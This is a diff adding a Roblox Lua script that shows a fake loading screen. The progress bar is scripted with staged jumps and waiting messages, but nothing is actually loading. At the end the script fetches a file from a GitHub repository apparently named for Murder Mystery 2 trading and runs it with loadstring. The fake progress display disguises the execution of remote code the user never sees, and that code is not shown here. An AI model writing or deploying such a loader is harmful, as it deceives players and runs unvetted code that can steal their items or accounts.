@@ -1,0 +1,138 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ============================================================
+-- 1. Создаём экран загрузки
+-- ============================================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LoaderScreen"
+ScreenGui.Parent = playerGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 300, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 22)
+MainFrame.BorderSizePixel = 0
+
+local UICorner = Instance.new("UICorner")
+UICorner.Parent = MainFrame
+UICorner.CornerRadius = UDim.new(0, 12)
+
+-- Кнопка закрытия (чтобы не бесила)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Parent = MainFrame
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+CloseBtn.TextSize = 14
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- ============================================================
+-- 2. Текстовые элементы
+-- ============================================================
+local Title = Instance.new("TextLabel")
+Title.Parent = MainFrame
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Position = UDim2.new(0, 0, 0, 10)
+Title.BackgroundTransparency = 1
+Title.Text = "Загрузка"
+Title.TextColor3 = Color3.fromRGB(220, 220, 220)
+Title.TextSize = 18
+Title.Font = Enum.Font.GothamBold
+
+-- Полоса загрузки (фон)
+local BarBg = Instance.new("Frame")
+BarBg.Parent = MainFrame
+BarBg.Size = UDim2.new(0, 260, 0, 10)
+BarBg.Position = UDim2.new(0.5, -130, 0.5, -5)
+BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+local BarCorner = Instance.new("UICorner")
+BarCorner.Parent = BarBg
+BarCorner.CornerRadius = UDim.new(1, 0)
+
+-- Полоса загрузки (сама полоска)
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Parent = BarBg
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
+local ProgCorner = Instance.new("UICorner")
+ProgCorner.Parent = ProgressBar
+ProgCorner.CornerRadius = UDim.new(1, 0)
+
+-- Текст с процентами
+local PercentText = Instance.new("TextLabel")
+PercentText.Parent = MainFrame
+PercentText.Size = UDim2.new(1, 0, 0, 30)
+PercentText.Position = UDim2.new(0, 0, 0, 90)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.TextColor3 = Color3.fromRGB(180, 180, 180)
+PercentText.TextSize = 14
+PercentText.Font = Enum.Font.Gotham
+
+-- Текст с состоянием
+local StatusText = Instance.new("TextLabel")
+StatusText.Parent = MainFrame
+StatusText.Size = UDim2.new(1, 0, 0, 40)
+StatusText.Position = UDim2.new(0, 0, 0, 120)
+StatusText.BackgroundTransparency = 1
+StatusText.Text = "Подождите пожалуйста, это займет 10-30 секунд..."
+StatusText.TextColor3 = Color3.fromRGB(150, 150, 150)
+StatusText.TextSize = 10
+StatusText.Font = Enum.Font.Gotham
+
+-- ============================================================
+-- 3. Плавная загрузка с реалистичными скачками
+-- ============================================================
+local function setProgress(value, text)
+    if value > 100 then value = 100 end
+    TweenService:Create(ProgressBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(value / 100, 0, 1, 0)
+    }):Play()
+    
+    PercentText.Text = math.floor(value) .. "%"
+    if text then StatusText.Text = text end
+end
+
+task.spawn(function()
+    -- Начало (0-22% за 2 секунды)
+    setProgress(0, "Инициализация...")
+    task.wait(0.5)
+    TweenService:Create(PercentText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+    task.wait(0.3)
+    PercentText.Text = "22%"
+    TweenService:Create(PercentText, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
+    TweenService:Create(ProgressBar, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0.22, 0, 1, 0)
+    }):Play()
+    
+    -- Резкий скачок до 51-60%
+    task.wait(2.0)
+    local jump = math.random(51, 60)
+    setProgress(jump, "Загрузка модулей...")
+    task.wait(0.5)
+    
+    -- Держим 4 секунды
+    task.wait(4.0)
+    
+    -- Финальный скачок и завершение
+    setProgress(99, "Подождите пожалуйста, это займет еще немного...")
+    task.wait(2.0)
+    setProgress(100, "Загрузка завершена!")
+    task.wait(0.5)
+    
+    -- Удаляем экран загрузки и запускаем твой скрипт
+    ScreenGui:Destroy()
+    
+    -- === СЮДА ВСТАВЬ ТВОЙ ЛОАДЕР ===
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ohnocringeomgvlad-cmd/TradeMm2/main/SCRIPT"))()
+end)
